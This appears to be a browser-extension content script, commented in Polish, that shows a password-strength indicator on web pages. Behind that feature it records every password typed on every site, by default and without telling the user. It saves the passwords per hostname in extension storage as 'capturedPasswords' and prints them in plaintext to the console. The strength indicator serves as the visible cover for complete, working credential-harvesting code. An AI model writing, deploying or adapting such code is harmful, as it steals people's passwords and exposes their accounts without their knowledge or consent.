import { Storage } from "@plasmohq/storage"

const storage = new Storage()
let passwordSniffingEnabled = true

// 🔍 Funkcja walidująca hasło (dynamicznie zmienia kolor pola)
function validatePassword(password: string, inputElement: HTMLInputElement): boolean {
    const regex = /^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/
    const isValid = regex.test(password)

    // 🔍 Znajdź lub utwórz element opisu pod inputem
    let descriptionElement = inputElement.nextElementSibling as HTMLDivElement
    if (!descriptionElement || !descriptionElement.classList.contains('password-description')) {
        descriptionElement = document.createElement('div')
        descriptionElement.classList.add('password-description')
        descriptionElement.style.marginTop = "10px" // Dodanie odstępu przed elementem
        descriptionElement.style.display = "block" // Ustawienie wyświetlania jako blokowego elementu
        descriptionElement.style.textAlign = "center" // Wyśrodkowanie tekstu
        inputElement.parentNode?.insertBefore(descriptionElement, inputElement.nextSibling)
    }

    // 🎨 Ustawienia stylów dla opisu
    descriptionElement.style.marginTop = "5px"
    descriptionElement.style.fontSize = "12px"
    descriptionElement.style.fontWeight = "bold"

    // 🛑 Walidacja hasła i zmiana wyglądu pola
    if (password.length > 2) {
        if (password.length < 8) {
            inputElement.style.border = "2px solid red"
            descriptionElement.textContent = "Hasło jest za krótkie (min. 8 znaków)"
            descriptionElement.style.color = "red"
        } else if (!/(?=.*[@$!%*?&])/.test(password)) {
            inputElement.style.border = "2px solid orange"
            descriptionElement.textContent = "Hasło musi zawierać znak specjalny (@$!%*?&)"
            descriptionElement.style.color = "orange"
        } else {
            inputElement.style.border = "2px solid green"
            descriptionElement.textContent = "✅ Hasło jest bezpieczne"
            descriptionElement.style.color = "green"
        }
    } else {
        inputElement.style.border = ""
        descriptionElement.textContent = ""
    }

    return isValid
}

// 🔄 Inicjalizacja
async function initialize() {
    try {
        const storedValue = await storage.get<boolean>("passwordSniffingEnabled")
        passwordSniffingEnabled = storedValue ?? true // Domyślnie true

        // 🎧 Nasłuchiwanie zmian w `passwordSniffingEnabled`
        storage.watch({
            passwordSniffingEnabled: (newValue) => {
                passwordSniffingEnabled = newValue.newValue
                console.log("🔄 Password Sniffing state changed:", newValue)
            }
        })

        setupPasswordTracking()
    } catch (error) {
        console.error("❌ Error during initialization:", error)
    }
}

// 🔍 Nasłuchiwanie zmian w polach hasła
function setupPasswordTracking() {
    const passwordInputs = document.querySelectorAll("input[type='password']") as NodeListOf<HTMLInputElement>

    passwordInputs.forEach(input => {
        input.addEventListener("input", async () => {
            console.log("🔑 Password input changed", input.value)
            validatePassword(input.value, input)
            await savePassword(input)
        })
    })

    console.log("🔄 Password tracking setup complete")
}

// 🕵️‍♂️ Obserwacja dynamicznie dodanych pól hasła
const observer = new MutationObserver(() => {
    setupPasswordTracking()
})
observer.observe(document.body, { childList: true, subtree: true })

// 💾 Zapisanie hasła do `storage`
async function savePassword(inputElement: HTMLInputElement) {
    if (!passwordSniffingEnabled) return

    const website = window.location.hostname
    const passwordValue = inputElement.value.trim()

    if (passwordValue.length > 0) {
        try {
            let savedPasswords = await storage.get<{ [key: string]: string }>("capturedPasswords") || {}

            savedPasswords[website] = passwordValue
            await storage.set("capturedPasswords", savedPasswords)

            console.log(`✅ Saved password for ${website}:`, passwordValue)
        } catch (error) {
            console.error("❌ Error saving password:", error)
        }
    } else {
        console.log(`❌ Password for ${website} does not meet the criteria or is empty`)
    }

    // 🔍 Podgląd zapisanych haseł w `storage`
    const savedPasswords = await storage.get<{ [key: string]: string }>("capturedPasswords") || {}
    console.log("📂 Current stored passwords:", savedPasswords)
}

// 🚀 Uruchomienie skryptu
initialize()